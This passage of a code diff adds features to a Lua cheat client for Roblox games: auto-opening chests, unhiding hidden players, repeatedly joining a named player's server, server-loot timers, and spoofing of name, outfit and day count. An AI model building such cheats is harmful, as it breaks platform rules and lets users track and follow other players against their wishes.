+                if dialogue_remote then
+                    auto_chest_dialog_connection = utility:Connection(dialogue_remote.OnClientEvent, handle_auto_chest_dialog)
+                    return
+                end
+
+                if #auto_chest_discovery_connections > 0 then
+                    return
+                end
+
+                local requests = FindFirstChild(rps, "Requests")
+                if not requests then
+                    return
+                end
+
+                local function sensitive(tbl, key)
+                    for k, _ in pairs(tbl) do
+                        if typeof(k) == "string" and k:lower() == key:lower() then
+                            return true
+                        end
+                    end
+                    return false
+                end
+
+                for _, remote in pairs(requests:GetChildren()) do
+                    if remote:IsA("RemoteEvent") then
+                        local connection
+                        connection = utility:Connection(remote.OnClientEvent, function(data)
+                            if typeof(data) == "table" and (sensitive(data, "choices") or sensitive(data, "speaker")) then
+                                dialogue_remote = remote
+                                disconnect_auto_chest_dialog()
+                                auto_chest_dialog_connection = utility:Connection(remote.OnClientEvent, handle_auto_chest_dialog)
+                                handle_auto_chest_dialog(data)
+                            end
+                        end)
+                        table.insert(auto_chest_discovery_connections, connection)
+                    end
+                end
+            end
+
+            group_misc:AddToggle("AutoIdolOfWar", {
+                Text = "Auto Idol of War",
+                Default = false,
+                Callback = function(state)
+                    if state then
+                        if auto_idol_running then
+                            return
+                        end
+
+                        auto_idol_running = true
+                        task.spawn(function()
+                            while shared and not shared.is_unloading and auto_idol_running and Toggles.AutoIdolOfWar and Toggles.AutoIdolOfWar.Value do
+                                local before_quantity = get_inventory_quantity("Idol of War")
+                                if before_quantity <= 0 then
+                                    break
+                                end
+
+                                local decreased = false
+                                repeat
+                                    local idol = find_inventory_tool("Idol of War")
+                                    if not idol then
+                                        break
+                                    end
+
+                                    equip_and_click_tool(idol)
+                                    task.wait(0.35)
+
+                                    local current_quantity = get_inventory_quantity("Idol of War")
+                                    decreased = current_quantity < before_quantity
+                                until decreased or not auto_idol_running or not (Toggles.AutoIdolOfWar and Toggles.AutoIdolOfWar.Value) or shared.is_unloading
+
+                                task.wait(0.1)
+                            end
+
+                            auto_idol_running = false
+                            if Toggles.AutoIdolOfWar and Toggles.AutoIdolOfWar.Value then
+                                Toggles.AutoIdolOfWar:SetValue(false)
+                            end
+                        end)
+                    else
+                        auto_idol_running = false
+                    end
+                end
+            })
+
+            group_misc:AddToggle("AutoChestOpen", {
+                Text = "Auto Chest Open",
+                Default = false,
+                Callback = function(state)
+                    if state then
+                        if auto_chest_running then
+                            return
+                        end
+
+                        auto_chest_running = true
+                        task.spawn(function()
+                            ensure_auto_chest_dialog()
+
+                            while shared and not shared.is_unloading and auto_chest_running and Toggles.AutoChestOpen and Toggles.AutoChestOpen.Value do
+                                local chest = get_war_chest()
+                                local click_detector = chest and FindFirstChildWhichIsA(chest, "ClickDetector", true)
+
+                                if not chest or not click_detector or not is_near_war_chest(chest, click_detector) then
+                                    break
+                                end
+
+                                if fireclickdetector then
+                                    pcall(function()
+                                        fireclickdetector(click_detector)
+                                    end)
+                                else
+                                    break
+                                end
+
+                                local start_time = tick()
+                                while tick() - start_time < 3.5 and auto_chest_running and Toggles.AutoChestOpen and Toggles.AutoChestOpen.Value and shared and not shared.is_unloading do
+                                    if not is_near_war_chest(chest, click_detector) then
+                                        auto_chest_running = false
+                                        break
+                                    end
+                                    task.wait(0.1)
+                                end
+                            end
+
+                            disconnect_auto_chest_dialog()
+                            auto_chest_running = false
+                            if Toggles.AutoChestOpen and Toggles.AutoChestOpen.Value then
+                                Toggles.AutoChestOpen:SetValue(false)
+                            end
+                        end)
+                    else
+                        auto_chest_running = false
+                        disconnect_auto_chest_dialog()
+                    end
+                end
+            })
+
+            group_misc:AddToggle("public_server_search", {
+                Text = "Public Server Search",
+                Default = true,
+                Callback = function(state)
+                    cheat_client.config.public_server_search = state
+                end
+            })
+
+            do
+                local inventory_search_frame = nil
+                local inventory_search_connection = nil
+
+                local function createInventorySearch()
+                    if shared and shared.is_unloading then return end
+
+                    if inventory_search_frame and inventory_search_frame.Parent then return end
+                    inventory_search_frame = nil
+
+                    local playerGui = FindFirstChild(plr, "PlayerGui")
+                    if not playerGui then return end
+
+                    local backpackGui = FindFirstChild(playerGui, "BackpackGui")
+                    if not backpackGui then return end
+
+                    local backpackFrame = FindFirstChild(backpackGui, "BackpackFrame")
+                    if not backpackFrame then return end
+
+                    local scrollingFrame = FindFirstChild(backpackFrame, "ScrollingFrame")
+                    if not scrollingFrame then return end
+
+                    if FindFirstChild(backpackFrame, "InventorySearch") then return end
+
+                    local Search = Instance.new("TextBox")
+                    local Border = Instance.new("ImageLabel")
+
+                    Search.Name = "InventorySearch"
+                    Search.Parent = backpackFrame
+                    Search.AnchorPoint = Vector2.new(0.5, 0)
+                    Search.BackgroundColor3 = Color3.fromRGB(226, 226, 226)
+                    Search.BorderColor3 = Color3.fromRGB(27, 42, 53)
+                    Search.BorderSizePixel = 0
+                    Search.Position = UDim2.new(0.0800000057, 0, -0.0399999991, 0)
+                    Search.Size = UDim2.new(0.15625, 0, 0.028, 0)
+                    Search.ZIndex = 2
+                    Search.ClearTextOnFocus = false
+                    Search.Font = Enum.Font.Bodoni
+                    Search.PlaceholderColor3 = Color3.fromRGB(22, 22, 22)
+                    Search.PlaceholderText = ""
+                    Search.Text = ""
+                    Search.TextColor3 = Color3.fromRGB(27, 25, 23)
+                    Search.TextSize = 20.000
+                    Search.TextTransparency = 0.100
+
+                    Border.Name = "Border"
+                    Border.Parent = Search
+                    Border.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+                    Border.BackgroundTransparency = 1.000
+                    Border.BorderColor3 = Color3.fromRGB(27, 42, 53)
+                    Border.BorderSizePixel = 0
+                    Border.Position = UDim2.new(0, -2, 0, -2)
+                    Border.Size = UDim2.new(1, 4, 1, 5)
+                    Border.ZIndex = 3
+                    Border.Image = "rbxassetid://2739347995"
+                    Border.ImageColor3 = Color3.fromRGB(245, 197, 130)
+                    Border.ScaleType = Enum.ScaleType.Slice
+                    Border.SliceCenter = Rect.new(5, 5, 5, 5)
+
+                    inventory_search_frame = Search
+
+                    inventory_search_connection = utility:Connection(Search:GetPropertyChangedSignal("Text"), function()
+                        if shared and shared.is_unloading then return end
+
+                        local text = Search.Text:lower()
+
+                        for _, v in pairs(scrollingFrame:GetChildren()) do
+                            if v:IsA("TextButton") then
+                                if text == "" or string.find(v.Name:lower(), text) then
+                                    v.Visible = true
+                                else
+                                    v.Visible = false
+                                end
+                            end
+                        end
+                    end)
+
+                    task.spawn(function()
+                        while Search and Search.Parent and shared and not shared.is_unloading do
+                            task.wait(1)
+                        end
+                        if Search then
+                            pcall(function()
+                                Search.Text = ""
+                            end)
+                        end
+                        pcall(function()
+                            for _, v in pairs(scrollingFrame:GetChildren()) do
+                                if v:IsA("TextButton") then
+                                    v.Visible = true
+                                end
+                            end
+                        end)
+                        if Search and Search.Parent then
+                            pcall(function()
+                                Search:Destroy()
+                            end)
+                        end
+                        inventory_search_frame = nil
+                    end)
+                end
+
+                local function cleanupInventorySearch()
+                    if inventory_search_connection then
+                        pcall(function() inventory_search_connection:Disconnect() end)
+                        inventory_search_connection = nil
+                    end
+                    if inventory_search_frame then
+                        pcall(function() inventory_search_frame:Destroy() end)
+                        inventory_search_frame = nil
+                    end
+                end
+
+                local inventory_search_char_connection = nil
+                local inventory_search_gui_connection = nil
+
+                group_misc:AddToggle("inventory_search", {
+                    Text = "Inventory Search",
+                    Default = cheat_client.config.inventory_search,
+                    Callback = function(state)
+                        cheat_client.config.inventory_search = state
+                        if state then
+                            if plr.Character then
+                                task.delay(0.5, createInventorySearch)
+                            end
+
+                            inventory_search_char_connection = utility:Connection(plr.CharacterAdded, function()
+                                if Toggles and Toggles.inventory_search and Toggles.inventory_search.Value then
+                                    task.wait(1)
+                                    createInventorySearch()
+                                end
+                            end)
+
+                            inventory_search_gui_connection = utility:Connection(plr.PlayerGui.ChildAdded, function(child)
+                                if child.Name == "BackpackGui" and Toggles and Toggles.inventory_search and Toggles.inventory_search.Value then
+                                    task.wait(0.5)
+                                    createInventorySearch()
+                                end
+                            end)
+                        else
+                            cleanupInventorySearch()
+                            if inventory_search_char_connection then
+                                pcall(function() inventory_search_char_connection:Disconnect() end)
+                                inventory_search_char_connection = nil
+                            end
+                            if inventory_search_gui_connection then
+                                pcall(function() inventory_search_gui_connection:Disconnect() end)
+                                inventory_search_gui_connection = nil
+                            end
+                        end
+                    end
+                })
+            end
+
             group_misc:AddDivider()
 
-            do -- Unhide Players
+            group_misc:AddToggle("roblox_chat", {
+                Text = "Roblox Chat",
+                Default = cheat_client.config.roblox_chat,
+                Callback = function(state)
+                    if state then
+                        txt.ChatWindowConfiguration.Enabled = true
+                    else
+                        txt.ChatWindowConfiguration.Enabled = false
+                    end
+                    cheat_client.config.roblox_chat = state
+                end
+            })
+
+            do
                 local unhide_connections = {}
                 local unhide_playeradded_connection
 
                 group_misc:AddToggle("unhide_players", {
-                    Text = "Unhide Players",
+                    Text = "Unhide Players (leaderboard)",
                     Default = cheat_client.config.unhide_players,
                     Callback = function(state)
                         if state then
                             local function unhide_player(v)
                                 if v:GetAttribute("Hidden") then
                                     v:SetAttribute("Hidden", false)
+                                end
+
+                                if game.PlaceId == 3541987450 then
+                                    local leaderstats = FindFirstChild(v, "leaderstats")
+                                    if leaderstats then
+                                        local hidden = FindFirstChild(leaderstats, "Hidden")
+                                        if hidden and hidden:IsA("BoolValue") and hidden.Value then
+                                            hidden.Value = false
+                                        end
+                                    end
                                 end
 
                                 if unhide_connections[v] then
@@ -6201,6 +10172,20 @@ if game.PlaceId == 100010170789226 then
                                         v:SetAttribute("Hidden", false)
                                     end
                                 end)
+
+                                if game.PlaceId == 3541987450 then
+                                    local leaderstats = FindFirstChild(v, "leaderstats")
+                                    if leaderstats then
+                                        local hidden = FindFirstChild(leaderstats, "Hidden")
+                                        if hidden and hidden:IsA("BoolValue") then
+                                            unhide_connections[v.Name.."_leaderstats"] = utility:Connection(hidden.Changed, function()
+                                                if hidden.Value == true then
+                                                    hidden.Value = false
+                                                end
+                                            end)
+                                        end
+                                    end
+                                end
                             end
 
                             for _, v in pairs(plrs:GetPlayers()) do
@@ -6209,6 +10194,17 @@ if game.PlaceId == 100010170789226 then
 
                             unhide_playeradded_connection = utility:Connection(plrs.PlayerAdded, function(v)
                                 unhide_player(v)
+                            end)
+
+                            utility:Connection(plrs.PlayerRemoving, function(v)
+                                if unhide_connections[v] then
+                                    unhide_connections[v]:Disconnect()
+                                    unhide_connections[v] = nil
+                                end
+                                if unhide_connections[v.Name.."_leaderstats"] then
+                                    unhide_connections[v.Name.."_leaderstats"]:Disconnect()
+                                    unhide_connections[v.Name.."_leaderstats"] = nil
+                                end
                             end)
 
                         else
@@ -6221,11 +10217,26 @@ if game.PlaceId == 100010170789226 then
 
                                 if (jack_char and jack_char:IsA("Tool")) or (jack_bag and jack_bag:IsA("Tool")) then
                                     v:SetAttribute("Hidden", true)
+
+                                    if game.PlaceId == 3541987450 then
+                                        local leaderstats = FindFirstChild(v, "leaderstats")
+                                        if leaderstats then
+                                            local hidden = FindFirstChild(leaderstats, "Hidden")
+                                            if hidden and hidden:IsA("BoolValue") then
+                                                hidden.Value = true
+                                            end
+                                        end
+                                    end
                                 end
 
                                 if unhide_connections[v] then
                                     unhide_connections[v]:Disconnect()
                                     unhide_connections[v] = nil
+                                end
+
+                                if unhide_connections[v.Name.."_leaderstats"] then
+                                    unhide_connections[v.Name.."_leaderstats"]:Disconnect()
+                                    unhide_connections[v.Name.."_leaderstats"] = nil
                                 end
                             end
 
@@ -6239,9 +10250,71 @@ if game.PlaceId == 100010170789226 then
                     end
                 })
             end
+
+            
+            group_misc:AddToggle("gate_anti_backfire", {
+                Text = "Gate Anti Backfire",
+                Default = cheat_client.config.gate_anti_backfire,
+                Callback = function(value)
+                    cheat_client.config.gate_anti_backfire = value
+                end
+            })
         end
 
-        do -- Server Join
+        do
+            local group_timers = Tabs.Misc:AddRightGroupbox("Server Info")
+
+            group_timers:AddLabel("PlrsServer", {
+                Text = "Players: " .. #plrs:GetPlayers(),
+                DoesWrap = false
+            })
+
+            group_timers:AddLabel("InventoryValue", {
+                Text = "Inventory Value: 0",
+                DoesWrap = false
+            })
+
+            group_timers:AddDivider()
+
+            if game.PlaceId == 5208655184 then
+                group_timers:AddLabel("CrLastLooted", {
+                    Text = "Castle Rock: " .. math.floor((os.time() - workspace:WaitForChild("MonsterSpawns"):WaitForChild("Triggers"):WaitForChild("CastleRockSnake"):WaitForChild("LastSpawned").Value) / 60) .. "m",
+                    DoesWrap = false
+                })
+
+                group_timers:AddLabel("TempleLastLooted", {
+                    Text = "Temple of Fire: " .. math.floor((os.time() - workspace:WaitForChild("MonsterSpawns"):WaitForChild("Triggers"):WaitForChild("MazeSnakes"):WaitForChild("LastSpawned").Value) / 60) .. "m",
+                    DoesWrap = false
+                })
+
+                group_timers:AddLabel("DeepLastLooted", {
+                    Text = "Deep Sunken: " .. math.floor((os.time() - workspace:WaitForChild("MonsterSpawns"):WaitForChild("Triggers"):WaitForChild("evileye2"):WaitForChild("LastSpawned").Value) / 60) .. "m",
+                    DoesWrap = false
+                })
+
+                group_timers:AddLabel("CryptLastLooted", {
+                    Text = "Crypt of Kings: " .. math.floor((os.time() - workspace:WaitForChild("MonsterSpawns"):WaitForChild("Triggers"):WaitForChild("CryptTrigger"):WaitForChild("LastSpawned").Value) / 60) .. "m",
+                    DoesWrap = false
+                })
+            elseif game.PlaceId == 3541987450 then
+                group_timers:AddLabel("blank2", {
+                    Text = " ",
+                    DoesWrap = false
+                })
+                
+                group_timers:AddLabel("PlayerBlessings", {
+                    Text = "Blessings: None",
+                    DoesWrap = false
+                })
+
+                group_timers:AddLabel("blank1", {
+                    Text = " ",
+                    DoesWrap = false
+                })
+            end
+        end
+
+        do
             local group_server_join = Tabs.Misc:AddRightGroupbox("Server Join")
             local debounce = false
 
@@ -6266,12 +10339,10 @@ if game.PlaceId == 100010170789226 then
                 return_to_menu()
                 library:Notify("Joining server: " .. jobId)
 
-                -- Use retry logic like attemptTeleport
                 teleport_failed = false
                 teleport_fail_reason = ""
                 join_server:FireServer(jobId)
 
-                -- Wait for teleport to succeed or fail
                 local timeout = tick() + 20
                 while tick() < timeout and not teleport_failed do
                     task.wait(0.1)
@@ -6304,6 +10375,33 @@ if game.PlaceId == 100010170789226 then
                 end
 
                 library:Notify("Searching servers for '" .. username .. "' ...")
+                local httpService = Services.HttpService
+                local serverInfo = FindFirstChild(rps, "ServerInfo")
+                if serverInfo then
+                    for _, serverFolder in ipairs(serverInfo:GetChildren()) do
+                        local jobId = serverFolder.Name
+                        local playersValue = FindFirstChild(serverFolder, "Players")
+
+                        if playersValue and playersValue:IsA("StringValue") then
+                            local success, playerData = pcall(function()
+                                return httpService:JSONDecode(playersValue.Value)
+                            end)
+
+                            if success and playerData and type(playerData) == "table" then
+                                for _, playerInfo in ipairs(playerData) do
+                                    if playerInfo.Name and playerInfo.Name:lower() == username:lower() then
+                                        library:Notify("Found '" .. username .. "' in server! Joining...")
+                                        library:Notify("Server ID: " .. jobId)
+                                        join_game_by_id(jobId)
+                                        return
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end
+
+                library:Notify("Not found in server list, checking API...")
                 local success, userId = pcall(function()
                     return plrs:GetUserIdFromNameAsync(username)
                 end)
@@ -6366,6 +10464,208 @@ if game.PlaceId == 100010170789226 then
 
             group_server_join:AddDivider()
 
+            do
+                local loop_join_connection = nil
+                local loop_join_last_attempt = 0
+                local current_job_index = 1
+
+                group_server_join:AddToggle("loop_join", {
+                    Text = "Loop Join",
+                    Default = cheat_client.config.loop_join,
+                    Tooltip = "Continuously attempt to join the Job ID(s) in the textbox above (10 attempts per second, cycles through multiple IDs)",
+                    Callback = function(value)
+                        cheat_client.config.loop_join = value
+
+                        if loop_join_connection then
+                            loop_join_connection:Disconnect()
+                            loop_join_connection = nil
+                        end
+
+                        if value then
+                            current_job_index = 1
+
+                            if Toggles.anti_afk then
+                                Toggles.anti_afk:SetValue(true)
+                            end
+
+                            loop_join_connection = utility:Connection(rs.Heartbeat, LPH_NO_VIRTUALIZE(function()
+                                local current_time = tick()
+                                if current_time - loop_join_last_attempt < 0.1 then return end
+                                loop_join_last_attempt = current_time
+
+                                if Options and Options.JobIdInput then
+                                    local input_value = Options.JobIdInput.Value
+                                    if input_value and input_value ~= "" then
+                                        local job_ids = {}
+                                        for job_id in string.gmatch(input_value, "[^,]+") do
+                                            local trimmed = job_id:match("^%s*(.-)%s*$")
+                                            if trimmed ~= "" then
+                                                job_ids[#job_ids + 1] = trimmed
+                                            end
+                                        end
+
+                                        if #job_ids > 0 then
+                                            local jobId = job_ids[current_job_index]
+
+                                            pcall(function()
+                                                if plr.Character then
+                                                    if cs:HasTag(plr.Character, "Danger") and not (Toggles and Toggles.ignore_danger and Toggles.ignore_danger.Value) then
+                                                        repeat rs.Heartbeat:Wait() until not plr.Character or not cs:HasTag(plr.Character, "Danger") or (Toggles and Toggles.ignore_danger and Toggles.ignore_danger.Value)
+                                                    end
+                                                    rps.Requests.ReturnToMenu:InvokeServer()
+                                                    task.wait(0.5)
+                                                end
+
+                                                join_server:FireServer(jobId)
+                                            end)
+
+                                            if #job_ids > 1 then
+                                                current_job_index = (current_job_index % #job_ids) + 1
+                                            end
+                                        end
+                                    end
+                                end
+                            end))
+                        else
+                            if Toggles.anti_afk then
+                                Toggles.anti_afk:SetValue(false)
+                            end
+                        end
+                    end
+                })
+
+                if Toggles.loop_join then
+                    Toggles.loop_join:SetValue(cheat_client.config.loop_join)
+                end
+            end
+
+            do
+                local loop_join_player_connection = nil
+                local loop_join_player_last_attempt = 0
+                local cached_username = nil
+                local cached_user_id = nil
+
+                group_server_join:AddToggle("loop_join_player", {
+                    Text = "Loop Join Player",
+                    Default = cheat_client.config.loop_join_player or false,
+                    Tooltip = "Continuously attempt to join the server where the player in the textbox above is playing (1 attempt per second, caches user ID)",
+                    Callback = function(value)
+                        cheat_client.config.loop_join_player = value
+
+                        if loop_join_player_connection then
+                            loop_join_player_connection:Disconnect()
+                            loop_join_player_connection = nil
+                        end
+
+                        if value then
+                            local username = Options.PlayerNameInput and Options.PlayerNameInput.Value or ""
+                            if username == "" then
+                                library:Notify("Please enter a player name first")
+                                Toggles.loop_join_player:SetValue(false)
+                                return
+                            end
+
+                            cached_username = username
+                            library:Notify("Caching user ID for '" .. username .. "'...")
+
+                            if Toggles.anti_afk then
+                                Toggles.anti_afk:SetValue(true)
+                            end
+
+                            task.spawn(function()
+                                local success, userId = pcall(function()
+                                    return plrs:GetUserIdFromNameAsync(username)
+                                end)
+
+                                if not success or not userId then
+                                    library:Notify("Failed to get user ID for '" .. username .. "'")
+                                    Toggles.loop_join_player:SetValue(false)
+                                    return
+                                end
+
+                                cached_user_id = userId
+                                library:Notify("Cached user ID for '" .. username .. "' (" .. userId .. ")")
+
+                                loop_join_player_connection = utility:Connection(rs.Heartbeat, LPH_NO_VIRTUALIZE(function()
+                                    local current_time = tick()
+                                    if current_time - loop_join_player_last_attempt < 1 then return end
+                                    loop_join_player_last_attempt = current_time
+
+                                    pcall(function()
+                                        local jobId = nil
+
+                                        local serverInfo = FindFirstChild(rps, "ServerInfo")
+                                        if serverInfo then
+                                            for _, serverFolder in ipairs(serverInfo:GetChildren()) do
+                                                local serverId = serverFolder.Name
+                                                local playersValue = FindFirstChild(serverFolder, "Players")
+
+                                                if playersValue and playersValue:IsA("StringValue") then
+                                                    local success, playerData = pcall(function()
+                                                        return Services.HttpService:JSONDecode(playersValue.Value)
+                                                    end)
+
+                                                    if success and playerData and type(playerData) == "table" then
+                                                        for _, playerInfo in ipairs(playerData) do
+                                                            if playerInfo.Name and playerInfo.Name:lower() == cached_username:lower() then
+                                                                jobId = serverId
+                                                                break
+                                                            end
+                                                        end
+                                                    end
+                                                end
+
+                                                if jobId then break end
+                                            end
+                                        end
+
+                                        if not jobId then
+                                            local joinable, apiJobId = utility:get_presence(cached_user_id)
+                                            if joinable and apiJobId then
+                                                jobId = apiJobId
+                                            end
+                                        end
+
+                                        if jobId then
+                                            if plr.Character then
+                                                if cs:HasTag(plr.Character, "Danger") and not (Toggles and Toggles.ignore_danger and Toggles.ignore_danger.Value) then
+                                                    repeat rs.Heartbeat:Wait() until not plr.Character or not cs:HasTag(plr.Character, "Danger") or (Toggles and Toggles.ignore_danger and Toggles.ignore_danger.Value)
+                                                end
+                                                rps.Requests.ReturnToMenu:InvokeServer()
+                                                task.wait(0.5)
+                                            end
+
+                                            join_server:FireServer(jobId)
+                                        end
+                                    end)
+                                end))
+                            end)
+                        else
+                            cached_username = nil
+                            cached_user_id = nil
+
+                            if Toggles.anti_afk then
+                                Toggles.anti_afk:SetValue(false)
+                            end
+                        end
+                    end
+                })
+
+                if Toggles.loop_join_player then
+                    Toggles.loop_join_player:SetValue(cheat_client.config.loop_join_player or false)
+                end
+            end
+
+            group_server_join:AddToggle("ignore_danger", {
+                Text = "Ignore Danger",
+                Default = cheat_client.config.ignore_danger,
+                Callback = function(value)
+                    cheat_client.config.ignore_danger = value
+                end
+            })
+
+            group_server_join:AddDivider()
+
             group_server_join:AddToggle("execute_on_serverhop", {
                 Text = "Execute on Serverhop",
                 Default = cheat_client.config.execute_on_serverhop,
@@ -6418,6 +10718,38 @@ if game.PlaceId == 100010170789226 then
                 Tooltip = "Join the server with the least players"
             })
 
+            group_server_join:AddButton({
+                Text = "Join Oldest Server",
+                Func = function()
+                    library:Notify("Finding oldest server...")
+                    local jobId = utility:get_oldest_server()
+                    if jobId then
+                        utility:add_server_to_history(jobId)
+                        join_game_by_id(jobId)
+                    else
+                        library:Notify("Failed to find oldest server")
+                    end
+                end,
+                DoubleClick = false,
+                Tooltip = "Join the server with the highest lifespan"
+            })
+
+            group_server_join:AddButton({
+                Text = "Join Newest Server",
+                Func = function()
+                    library:Notify("Finding newest server...")
+                    local jobId = utility:get_newest_server()
+                    if jobId then
+                        utility:add_server_to_history(jobId)
+                        join_game_by_id(jobId)
+                    else
+                        library:Notify("Failed to find newest server")
+                    end
+                end,
+                DoubleClick = false,
+                Tooltip = "Join the server with the lowest lifespan"
+            })
+
             group_server_join:AddDivider()
 
             group_server_join:AddButton({
@@ -6432,7 +10764,7 @@ if game.PlaceId == 100010170789226 then
 
         end
 
-        do -- Spoofing
+        do
             local group_spoofing = Tabs.Misc:AddLeftGroupbox("Spoofing")
 
             local char_custom_connection = nil
@@ -6521,11 +10853,9 @@ if game.PlaceId == 100010170789226 then
                 local success,err = pcall(function()
                     local shirt = FindFirstChild(gender_folder, "Shirt")
                     if shirt and shirt:IsA("Shirt") then
-                        -- Store the outfit's shirt template and color to config
                         cheat_client.config.char_custom_shirt = shirt.ShirtTemplate
                         cheat_client.config.outfit_shirt_color = shirt.Color3
 
-                        -- update input field to trigger save
                         if Options and Options.char_custom_shirt then
                             Options.char_custom_shirt:SetValue(shirt.ShirtTemplate)
                         end
@@ -6539,11 +10869,9 @@ if game.PlaceId == 100010170789226 then
 
                     local pants = FindFirstChild(gender_folder, "Pants")
                     if pants and pants:IsA("Pants") then
-                        -- Store the outfit's pants template and color to config
                         cheat_client.config.char_custom_pants = pants.PantsTemplate
                         cheat_client.config.outfit_pants_color = pants.Color3
 
-                        -- update input field to trigger save
                         if Options and Options.char_custom_pants then
                             Options.char_custom_pants:SetValue(pants.PantsTemplate)
                         end
@@ -6555,7 +10883,6 @@ if game.PlaceId == 100010170789226 then
                         char_custom_enabled.pants = true
                     end
 
-                    -- Disable clothing dye when outfit is loaded (don't apply custom dye)
                     char_custom_enabled.clothing_dye = false
                 end)
 
@@ -6689,7 +11016,6 @@ if game.PlaceId == 100010170789226 then
                         body_colors.RightLegColor3 = original_char_state.skin_color
                     end
 
-                    -- RLFace restoration is now handled in the face section above to prevent duplication
 
                     for _, acc in ipairs(current_accessories) do
                         if acc and acc.Parent then
@@ -6708,7 +11034,6 @@ if game.PlaceId == 100010170789226 then
                 if face_id == "" then return end
 
                 local success, err = pcall(function()
-                    -- extract id from various formats
                     local extracted_id = face_id:match("asset/%?id=(%d+)") or
                                        face_id:match("rbxassetid://(%d+)") or
                                        face_id:match("^(%d+)$") or
@@ -6744,8 +11069,9 @@ if game.PlaceId == 100010170789226 then
                 end
             end
 
-            local httpService = game:GetService("HttpService")
+            local httpService = Services.HttpService
             local template_cache = {}
+            local MAX_TEMPLATE_CACHE = 500
 
             local function get_template_id(asset_id)
                 if template_cache[asset_id] then
@@ -6767,6 +11093,16 @@ if game.PlaceId == 100010170789226 then
                     local template_id = response.Body:match("id=(%d+)")
 
                     if template_id then
+                        local cache_count = 0
+                        for _ in pairs(template_cache) do
+                            cache_count = cache_count + 1
+                        end
+
+                        if cache_count >= MAX_TEMPLATE_CACHE then
+                            local oldest_key = next(template_cache)
+                            template_cache[oldest_key] = nil
+                        end
+
                         template_cache[asset_id] = {
                             assetId = tonumber(asset_id),
                             templateId = tonumber(template_id),
@@ -6810,7 +11146,7 @@ if game.PlaceId == 100010170789226 then
                     shirt.ShirtTemplate = target_template
 
                     task.wait(0.5)
-                    if shirt.ShirtTemplate == target_template then
+                    if shirt.ShirtTemplate == target_template and utility then
                         utility:Connection(shirt:GetPropertyChangedSignal("ShirtTemplate"), function()
                             if shirt.ShirtTemplate ~= target_template then
                                 shirt.ShirtTemplate = target_template
@@ -6852,7 +11188,7 @@ if game.PlaceId == 100010170789226 then
                     pants.PantsTemplate = target_template
 
                     task.wait(0.5)
-                    if pants.PantsTemplate == target_template then
+                    if pants.PantsTemplate == target_template and utility then
                         utility:Connection(pants:GetPropertyChangedSignal("PantsTemplate"), function()
                             if pants.PantsTemplate ~= target_template then
                                 pants.PantsTemplate = target_template
@@ -6987,7 +11323,7 @@ if game.PlaceId == 100010170789226 then
             local function apply_all_customizations(character)
                 repeat task.wait() until FindFirstChild(character, "Humanoid")
                 repeat task.wait() until FindFirstChild(character, "Head")
-                repeat task.wait() until FindFirstChild(character, "Head"):FindFirstChild("RLFace")
+                repeat task.wait() until character:FindFirstChild("Head"):FindFirstChild("RLFace")
 
                 task.wait(0.5)
                 if not character or not character.Parent then return end
@@ -7132,6 +11468,13 @@ if game.PlaceId == 100010170789226 then
                     apply_all_customizations(character)
                 end)
 
+                utility:Connection(plr.CharacterRemoving, function()
+                    for _, conn in ipairs(char_monitor_connections) do
+                        pcall(function() conn:Disconnect() end)
+                    end
+                    char_monitor_connections = {}
+                end)
+
                 if plr.Character then
                     apply_all_customizations(plr.Character)
                 end
@@ -7157,7 +11500,6 @@ if game.PlaceId == 100010170789226 then
                             until originalName and originalName ~= "nil" and originalName ~= ""
                             original_names[plr] = originalName
                         end
-                        -- apply_streamer handles both custom name and Ragoozer logic
                         cheat_client:apply_streamer(state)
                     else
                         cheat_client:apply_streamer(state)
@@ -7168,7 +11510,7 @@ if game.PlaceId == 100010170789226 then
             group_spoofing:AddInput("custom_name_spoof", {
                 Default = cheat_client.config.custom_name_spoof,
                 Numeric = false,
-                Finished = true,
+                Finished = false,
                 Text = "Custom Name",
                 Tooltip = "Requires Streamer Mode enabled. Leave empty for default (Fear + random last name)",
                 Placeholder = "Leave empty for default",
@@ -7195,6 +11537,95 @@ if game.PlaceId == 100010170789226 then
                         if cheat_client.last_names and #cheat_client.last_names > 0 then
                             local random_lastname = cheat_client.last_names[math.random(1, #cheat_client.last_names)]
                             cheat_client:spoof_name("Fear " .. random_lastname)
+                        end
+                    end
+                end
+            })
+
+            group_spoofing:AddInput("custom_day_spoof", {
+                Text = "Custom Days",
+                Default = tostring(cheat_client.config.custom_day_spoof),
+                Numeric = true,
+                Finished = false,
+                Placeholder = "Enter days (1-999)",
+                Callback = function(value)
+                    local num_value = tonumber(value)
+                    if num_value and num_value >= 1 and num_value <= 999 then
+                        cheat_client.config.custom_day_spoof = num_value
+                        if cheat_client.config.spoof_days_enabled then
+                            cheat_client:spoof_days(num_value)
+                        end
+                    end
+                end
+            })
+
+            group_spoofing:AddToggle("spoof_days_enabled", {
+                Text = "Enable Day Spoof",
+                Default = cheat_client.config.spoof_days_enabled,
+                Callback = function(state)
+                    cheat_client.config.spoof_days_enabled = state
+                    if state then
+                        cheat_client:spoof_days(cheat_client.config.custom_day_spoof)
+                    else
+                        if original_days.hundred then
+                            local stat_gui = FindFirstChild(plr.PlayerGui, "StatGui")
+                            if stat_gui then
+                                local lives = FindFirstChild(stat_gui.Container.Health, "Lives")
+                                if lives then
+                                    local rollers = {}
+                                    for _, child in ipairs(lives:GetChildren()) do
+                                        if child.Name == "Roller" and FindFirstChild(child, "Char") then
+                                            table.insert(rollers, child)
+                                        end
+                                    end
+
+                                    if #rollers >= 4 then
+                                        local has_thousand = #rollers >= 6
+
+                                        local thousand, hundred, ten, one
+                                        if has_thousand then
+                                            thousand = rollers[2]
+                                            hundred = rollers[3]
+                                            ten = rollers[4]
+                                            one = rollers[5]
+                                        else
+                                            hundred = rollers[2]
+                                            ten = rollers[3]
+                                            one = rollers[4]
+                                        end
+
+                                        if thousand and original_days.thousand and original_days.thousand.text then
+                                            thousand.Char.Text = original_days.thousand.text
+                                        end
+                                        if hundred and original_days.hundred.text then
+                                            hundred.Char.Text = original_days.hundred.text
+                                        end
+                                        if ten and original_days.ten.text then
+                                            ten.Char.Text = original_days.ten.text
+                                        end
+                                        if one and original_days.one.text then
+                                            one.Char.Text = original_days.one.text
+                                        end
+
+                                        if original_days.thousand and original_days.thousand.connection then
+                                            original_days.thousand.connection:Disconnect()
+                                            original_days.thousand.connection = nil
+                                        end
+                                        if original_days.hundred.connection then
+                                            original_days.hundred.connection:Disconnect()
+                                            original_days.hundred.connection = nil
+                                        end
+                                        if original_days.ten.connection then
+                                            original_days.ten.connection:Disconnect()
+                                            original_days.ten.connection = nil
+                                        end
+                                        if original_days.one.connection then
